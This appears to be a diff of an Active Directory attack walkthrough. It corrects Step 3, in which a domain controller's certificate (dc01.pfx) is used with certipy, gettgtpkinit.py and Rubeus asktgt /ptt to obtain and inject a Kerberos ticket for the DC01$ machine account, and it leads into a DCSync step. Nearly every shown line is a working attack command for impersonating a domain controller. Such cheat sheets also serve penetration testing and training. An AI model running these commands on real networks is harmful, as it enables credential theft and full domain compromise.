@@ -215,9 +215,9 @@ certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1
 python3 gettgtpkinit.py -cert-pfx dc01.pfx -pfx-pass '' corp.local/DC01$ dc01.ccache
 export KRB5CCNAME=dc01.ccache
 
-# Windows (Rubeus)
+# Windows (Rubeus) — /certificate accepts a PFX file path or base64-encoded PFX
 Rubeus.exe asktgt /user:DC01$ /domain:corp.local /dc:dc1.corp.local \
-  /certificate:MIIRdQIBAz... /ptt /outfile:dc01.kirbi
+  /certificate:C:\Windows\Temp\dc01.pfx /password:"" /ptt /outfile:dc01.kirbi
 ```
 
 ### Step 4 — DCSync
